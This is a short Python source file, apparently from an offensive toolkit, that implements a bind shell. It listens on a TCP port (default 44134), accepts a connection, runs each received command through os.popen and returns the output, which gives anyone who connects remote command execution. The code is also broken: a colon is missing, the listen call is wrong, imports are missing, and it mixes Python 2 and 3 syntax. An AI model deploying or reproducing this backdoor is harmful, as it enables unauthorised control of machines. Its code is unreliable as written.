# load socket lib from python core
import socket

# method for bind shell
def bind_shell(self, host=None, port=None)
    
    # if host not entered in function return 0
    if host is None:
        return 0

    # if port not specificied default to 44134
    if port is None:
        port = int(44134)

    # sleep for 5 seconds to account for closing already opened sockets 
    sleep(5)

    # attempt to run bind shell
    try:

        # create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # bind socket to the address
        sock.bind((host,port))
        
        # listen for 100 connections
        socket.listen(100)
        

        while True:
            # socket accepts connect
            client, address = sock.accept()

            while True:
                self.shell_text(client, host)
                # get the recieved data from the other connected socket and store it in command
                command = client.recv(1024).encode('UTF-8')

                # open a pipe to run the recieved command from the connected socket and read the systems outout and store in result
                result = os.popen(command).read()

                # send the pipes output back to the connected socket
                client.send(result)

    except Exception as error:
        print "[-] Failed to create socket: {0}".format(str(error))